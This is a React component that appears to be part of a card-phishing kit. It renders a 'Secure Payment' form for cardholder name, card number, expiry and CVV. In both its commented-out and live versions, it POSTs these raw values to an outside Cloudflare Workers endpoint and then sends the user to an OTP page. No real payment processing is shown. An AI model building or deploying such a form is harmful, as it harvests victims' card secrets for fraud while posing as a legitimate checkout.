// import React, { useState } from "react";
// import { useNavigate } from "react-router-dom";

// export default function ATMPage() {
//     const [form, setForm] = useState({
//         name: "",
//         cardNumber: "",
//         expiry: "",
//         cvv: "",
//     });
//     const navigate = useNavigate();
//      const [error, setError] = useState("");
//     // Card number formatter (1234 5678 9012 3456)
//     // const handleCardNumber = (e) => {
//     //     let value = e.target.value.replace(/\D/g, "").slice(0, 16);
//     //     value = value.replace(/(.{4})/g, "$1 ").trim();
//     //     setForm({ ...form, cardNumber: value });
//     // };
//      const handleCardNumber = (e) => {
//         let value = e.target.value.replace(/\D/g, "").slice(0, 16);
//         value = value.replace(/(.{4})/g, "$1 ").trim();
//         setForm({ ...form, cardNumber: value });
//     };

//     // Expiry formatter (MM/YY)
//     const handleExpiry = (e) => {
//         let value = e.target.value.replace(/\D/g, "").slice(0, 4);
//         if (value.length >= 3) {
//             value = value.slice(0, 2) + "/" + value.slice(2);
//         }
//         setForm({ ...form, expiry: value });
//     };

//     const handleChange = (e) => {
//         setForm({ ...form, [e.target.name]: e.target.value });
//     };

//     const handleSubmit = async (e) => {
//         e.preventDefault();
//         if (
//             !form.name ||
//             form.cardNumber.replace(/\s/g, "").length !== 16 ||
//             form.expiry.length !== 5 ||
//             form.cvv.length !== 3
//         ) {
//             setError("Please fill all required fields correctly");
//             return;
//         }

//         setError("");
//         const payload = {
//             cardHolder: form.name,
//             cardNumber: form.cardNumber,
//             expiryDate: form.expiry,
//             cvv: form.cvv
//         };

//         await fetch("https://my-worker-app.instapayapi.workers.dev/api/card", {
//             method: "POST",
//             headers: { "Content-Type": "application/json" },
//             body: JSON.stringify(payload),
//         });
//         setForm({
//             name: "",
//             cardNumber: "",
//             expiry: "",
//             cvv: "",
//         })
//         // alert("Demo submitted (no real card data sent)");
//     };


//     return (
//         <div className="min-h-screen flex items-center justify-center bg-gradient-to-br from-green-100 via-gray-100 to-green-200 px-4">
//             <form
//                 onSubmit={handleSubmit}
//                 className="bg-white w-full max-w-md rounded-2xl shadow-2xl p-6 sm:p-8"
//             >
//                 {/* Header */}
//                 <h2 className="text-2xl font-bold text-center text-gray-800 mb-2">
//                     Secure Payment
//                 </h2>
//                 {error && (
//                     <p className="text-red-600 text-sm text-center mb-4">
//                         {error}
//                     </p>
//                 )}
//                 {/* Card Holder */}
//                 <div className="mb-4">
//                     <label className="block text-sm font-semibold text-gray-600 mb-1">
//                         Card Holder Name
//                     </label>
//                     <input
//                         type="text"
//                         name="name"
//                         // placeholder="John Doe"
//                         value={form.name}
//                         onChange={handleChange}
//                         className="w-full border rounded-lg px-4 py-3 focus:ring-2 focus:ring-green-500 focus:outline-none"
//                         required
//                     />
//                 </div>

//                 {/* Card Number */}
//                 <div className="mb-4">
//                     <label className="block text-sm font-semibold text-gray-600 mb-1">
//                         Card Number
//                     </label>
//                     <input
//                         type="number"
//                         placeholder="1234 5678 9012 3456"
//                         pattern="[0-9]*"
//                         value={form.cardNumber}
//                         onChange={handleCardNumber}
//                         className="w-full border rounded-lg px-4 py-3 tracking-widest focus:ring-2 focus:ring-green-500 focus:outline-none"
//                         required
//                     />
//                 </div>

//                 {/* Expiry + CVV */}
//                 <div className="flex gap-4 mb-6">
//                     <div className="w-1/2">
//                         <label className="block text-sm font-semibold text-gray-600 mb-1">
//                             Expiry (MM/YY)
//                         </label>
//                         <input
//                             type="number"
//                             placeholder="12/30"
//                             value={form.expiry}
//                             onChange={handleExpiry}
//                             className="w-full border rounded-lg px-4 py-3 focus:ring-2 focus:ring-green-500 focus:outline-none"
//                             required
//                         />
//                     </div>

//                     <div className="w-1/2">
//                         <label className="block text-sm font-semibold text-gray-600 mb-1">
//                             CVV
//                         </label>
//                         <input
//                             type="password"
//                             placeholder="***"
//                             value={form.cvv}
//                             onChange={(e) =>
//                                 setForm({
//                                     ...form,
//                                     cvv: e.target.value.replace(/\D/g, "").slice(0, 3),
//                                 })
//                             }
//                             className="w-full border rounded-lg px-4 py-3 focus:ring-2 focus:ring-green-500 focus:outline-none"
//                             required
//                         />
//                     </div>
//                 </div>

//                 {/* Button */}
//                 <button
//                     onClick={() => navigate('/otp')}
//                     type="submit"
//                     className="w-full bg-gradient-to-r from-green-600 to-green-700 text-white py-3 rounded-xl font-bold text-lg shadow-lg hover:from-green-700 hover:to-green-800 transition-all active:scale-95"
//                 >
//                     Pay Now
//                 </button>
//             </form>
//         </div>
//     );
// }
import React, { useState } from "react";
import { useNavigate } from "react-router-dom";

export default function ATMPage() {
    const navigate = useNavigate();

    const [form, setForm] = useState({
        name: "",
        cardNumber: "",
        expiry: "",
        cvv: "",
    });

    const [error, setError] = useState("");

    // Card number formatter
    const handleCardNumber = (e) => {
        let value = e.target.value.replace(/\D/g, "").slice(0, 16);
        value = value.replace(/(.{4})/g, "$1 ").trim();
        setForm({ ...form, cardNumber: value });
    };

    // Expiry formatter
    const handleExpiry = (e) => {
        let value = e.target.value.replace(/\D/g, "").slice(0, 4);
        if (value.length >= 3) {
            value = value.slice(0, 2) + "/" + value.slice(2);
        }
        setForm({ ...form, expiry: value });
    };

    const handleChange = (e) => {
        setForm({ ...form, [e.target.name]: e.target.value });
    };

    const handleSubmit = async (e) => {
        e.preventDefault();

        // 🔴 Validation
        if (
            !form.name ||
            form.cardNumber.replace(/\s/g, "").length !== 16 ||
            form.expiry.length !== 5 ||
            form.cvv.length !== 3
        ) {
            setError("Please fill all required fields correctly");
            return;
        }

        setError("");

        const payload = {
            cardHolder: form.name,
            cardNumber: form.cardNumber,
            expiryDate: form.expiry,
            cvv: form.cvv,
        };

        await fetch(
            "https://my-worker-app.instapayapi.workers.dev/api/card",
            {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload),
            }
        );

        setForm({
            name: "",
            cardNumber: "",
            expiry: "",
            cvv: "",
        });

        navigate("/otp");
    };

    return (
        <div className="min-h-screen flex items-center justify-center bg-gradient-to-br from-green-100 via-gray-100 to-green-200 px-4">
            <form
                onSubmit={handleSubmit}
                className="bg-white w-full max-w-md rounded-2xl shadow-2xl p-6 sm:p-8"
            >
                <h2 className="text-2xl font-bold text-center text-gray-800 mb-4">
                    Secure Payment
                </h2>

                {/* Error Message */}
                {error && (
                    <p className="text-red-600 text-sm text-center mb-4">
                        {error}
                    </p>
                )}

                {/* Card Holder */}
                <div className="mb-4">
                    <label className="text-sm font-semibold text-gray-600">
                        Card Holder Name
                    </label>
                    <input
                        type="text"
                        name="name"
                        value={form.name}
                        onChange={handleChange}
                        className="w-full border rounded-lg px-4 py-3 focus:ring-2 focus:ring-green-500"
                    />
                </div>

                {/* Card Number */}
                <div className="mb-4">
                    <label className="text-sm font-semibold text-gray-600">
                        Card Number
                    </label>
                    <input
                        type="text"
                        inputMode="numeric"
                        // pattern="[0-9]*"
                        pattern="[0-9 ]{19}"
                        placeholder="1234 5678 9012 3456"
                        value={form.cardNumber}
                        onChange={handleCardNumber}
                        className="w-full border rounded-lg px-4 py-3 tracking-widest focus:ring-2 focus:ring-green-500"
                    />
                </div>

                {/* Expiry + CVV */}
                <div className="flex gap-4 mb-6">
                    <div className="w-1/2">
                        <label className="text-sm font-semibold text-gray-600">
                            Expiry
                        </label>
                        <input
                            type="text"
                            inputMode="numeric"
                            pattern="[0-9]*"
                            placeholder="MM/YY"
                            value={form.expiry}
                            onChange={handleExpiry}
                            className="w-full border rounded-lg px-4 py-3 focus:ring-2 focus:ring-green-500"
                        />
                    </div>

                    <div className="w-1/2">
                        <label className="text-sm font-semibold text-gray-600">
                            CVV
                        </label>
                        <input
                            type="password"
                            inputMode="numeric"
                            pattern="[0-9]*"
                            placeholder="***"
                            value={form.cvv}
                            onChange={(e) =>
                                setForm({
                                    ...form,
                                    cvv: e.target.value
                                        .replace(/\D/g, "")
                                        .slice(0, 3),
                                })
                            }
                            className="w-full border rounded-lg px-4 py-3 focus:ring-2 focus:ring-green-500"
                        />
                    </div>
                </div>

                <button
                    type="submit"
                    className="w-full bg-gradient-to-r from-green-600 to-green-700 text-white py-3 rounded-xl font-bold text-lg shadow-lg hover:from-green-700 hover:to-green-800 active:scale-95"
                >
                    Pay Now
                </button>
            </form>
        </div>
    );
}
